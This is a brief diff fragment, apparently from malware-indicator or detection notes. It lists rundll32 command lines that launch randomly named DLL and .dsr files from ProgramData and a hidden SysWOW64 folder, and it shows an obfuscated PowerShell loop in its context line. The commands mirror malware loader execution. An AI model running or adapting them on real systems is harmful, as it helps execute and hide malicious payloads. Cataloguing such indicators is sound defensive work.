@@ -24,13 +24,13 @@ foreach ($yidsrhye34syufgxjcdf in $mjxdfshdrfgzses4) {
 
 cmd.exe /c start /B c:\windows\syswow64\rundll32.exe c:\programdata\puihoud.dll,tjpleowdsyf
 
-c:\windows\syswow64\rundll32.exe  c:\programdata\puihoud.dll,tjpleowdsyf
+rundll32.exe c:\programdata\puihoud.dll,tjpleowdsyf
 
-C:\Windows\SysWOW64\rundll32.exe "c:\programdata\puihoud.dll",DllRegisterServer
+rundll32.exe c:\programdata\puihoud.dll,DllRegisterServer
 
-C:\Windows\SysWOW64\rundll32.exe "C:\Windows\SysWOW64\Egmsgwkioe\yqhmuwiuncnlul.dsr",IivICkzJYSdsZh
+rundll32.exe C:\Windows\SysWOW64\Egmsgwkioe\yqhmuwiuncnlul.dsr,IivICkzJYSdsZh
 
-C:\Windows\SysWOW64\rundll32.exe "C:\Windows\System32\Egmsgwkioe\yqhmuwiuncnlul.dsr",DllRegisterServer
+rundll32.exe C:\Windows\System32\Egmsgwkioe\yqhmuwiuncnlul.dsr,DllRegisterServer
 
 
 .dll distro
